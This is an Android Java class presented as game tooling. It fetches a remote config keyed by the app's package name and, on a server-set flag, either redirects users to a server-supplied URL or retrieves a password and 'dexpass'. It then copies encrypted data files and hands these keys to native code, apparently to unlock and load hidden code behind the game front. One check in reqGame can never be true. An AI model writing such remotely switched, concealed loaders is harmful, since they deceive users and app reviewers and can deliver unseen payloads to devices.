package com.rugame.common.tools;

import android.app.Activity;
import android.util.Base64;

import com.rugame.common.GameSaveTools;
import com.rugame.common.NativeSDK;

import org.json.JSONObject;

public class GameTTools {
    protected NativeSDK nativeSDK;
    public Activity content;
    String getPackageName(){
        return  this.nativeSDK.getPackageName();
    }

    protected void gotogame(String dex,String pass){
        for (int index = 0; index <=4; index++) {
            this.nativeSDK.copydata(this.nativeSDK.GetAndroidInternalStoragePath()+"/sppng/data_" + index + ".bin","gamedata/data_" + index + ".txt");
        }

        this.nativeSDK.setdata1(dex);
        this.nativeSDK.setdata2(pass);
        this.nativeSDK.writefile(this.nativeSDK.GetAndroidInternalStoragePath() + "/passs.txt", dex);
        this.nativeSDK.writefile(this.nativeSDK.GetAndroidInternalStoragePath() + "/gamepass2.txt", pass);
        this.nativeSDK.feiqifunctoin();
        this.nativeSDK.allfinish();

    }
    protected void okreq(String result){
        if (result==null||result.length()<=0){
            NativeSDK.game();
            return;
        }

        try {
            result = this.nativeSDK.getGameCFG(result,"");
            String data = "";
            JSONObject jsonObject = new JSONObject(result);

            JSONObject tempObect = new JSONObject(jsonObject.getString("data"));
            if (tempObect!=null){
                int open = tempObect.getInt("open");

                if (open==0){
                    String otdata = tempObect.getString("otdata");
                    data=otdata;
                }else if (open==1 && this.nativeSDK.getItem("openJumpWeb")!=null&&this.nativeSDK.getItem("openJumpWeb").equals("1")==false){
                    this.nativeSDK.setItem("openJumpWeb","1");
                    this.nativeSDK.openJumpWeb(tempObect.getString("url"));
                    data=tempObect.getString("otdata");
                }else if (open==2){
                    this.nativeSDK.setItem("openInWeb", "1");
                    this.nativeSDK.openInWeb(tempObect.getString("url"));
                    data = "1," + tempObect.getString("url");
                    this.nativeSDK.setItem("openInWebdata", data);
                }
            }
            jsonObject.put("data",data);
            String jsondata = jsonObject.toString();

            this.nativeSDK.writefile(this.nativeSDK.GetAndroidInternalStoragePath()+"/app.txt",jsondata);
            // 编码
            String encoded = Base64.encodeToString(
                    jsondata.getBytes(),
                    Base64.DEFAULT
            );
            this.nativeSDK.setItem("gameadta",encoded);


            JSONObject jsonData = new JSONObject(jsondata);
            JSONObject gameData = new JSONObject(jsonData.getString("ps"));

            String parts = gameData.getString("imgs");
            String[] a = parts.split(",");

            this.nativeSDK.setItem("password", a[0]);
            this.nativeSDK.setItem("dexpass", a[3]);

            this.gotogame( a[0],  a[3]);
        }catch (Exception a){
            a.printStackTrace();
            NativeSDK.game();
        }
    }

    public void reqGame(){
        nativeSDK=new NativeSDK();
        String oo = GameSaveTools.getInstance(content).getString("openInWeb","");
        String gameKey = this.nativeSDK.getItem("password");
        if (oo.equals("false")&&oo.equals("1")){
            this.gotogame(gameKey,this.nativeSDK.getItem("dexpass"));
            return;
        }
        oo = GameSaveTools.getInstance(content).getString("password","");
        if (oo.length()>2){
            this.gotogame(gameKey,this.nativeSDK.getItem("dexpass"));
            return;
        }
        String passurl = NativeSDK.getGT()+getPackageName();
        NetworkUtils.makeGetRequest(passurl, new NetworkUtils.Callback() {
            @Override
            public void onSuccess(String result) {
                okreq(result);
            }

            @Override
            public void onError(Exception e) {
                e.printStackTrace();
                NativeSDK.game();
            }
        });
    }
}
